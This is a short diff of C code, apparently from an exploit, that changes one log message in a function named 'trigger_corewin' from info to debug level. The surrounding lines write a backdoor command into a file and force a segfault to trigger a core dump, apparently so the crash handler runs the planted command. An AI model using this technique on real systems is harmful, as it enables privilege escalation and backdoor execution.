@@ -50,7 +50,7 @@ void trigger_corewin(const char *backdoor_file, const char *backdoor_cmd) {
     SYSCHK(write(fd, backdoor_cmd, strlen(backdoor_cmd) + 1));
     close(fd);
 
-    log_info("core dumping...");
+    log_debug("core dumping...");
     *(volatile uint8_t *)0 = 0;
 
     log_error("could not send SEGV signal");
